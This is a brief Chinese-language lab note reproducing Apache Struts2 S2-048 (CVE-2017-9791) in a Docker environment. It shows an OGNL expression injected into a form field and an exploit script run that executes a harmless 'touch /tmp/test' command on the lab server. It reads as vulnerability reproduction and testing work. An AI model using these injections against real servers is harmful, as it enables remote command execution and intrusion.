##  S2-048（CVE-2017-9791）
https://cwiki.apache.org/confluence/display/WW/S2-048

受影响：Struts 2.3.x with Struts 1 plugin and Struts 1 action

struts 2.3.33测试没有成功。struts 2.3.1成功

## 测试环境
```
docker-compose build
docker-compose up -d
```


## POC
http://10.160.11.191:8080/integration/editGangster.action

Gangster Name:%{12+2} 提交之后 

Gangster 14 added successfully

```
脚本测试在tmp目录下创建一个文件
 python s2-048.py http://10.160.11.191:8080/integration/saveGangster.action "/usr/bin/touch /tmp/test"
[*] exploit Apache Struts2 S2-048
[+] command: /usr/bin/touch /tmp/test

文件被创建，任意命令执行成功
docker exec -it s2048_struts2_1 /bin/bash
ls /tmp/
hsperfdata_root  test

```

## 参考：
* http://www.cnvd.org.cn/webinfo/show/4184

* https://www.exploit-db.com/exploits/42324/

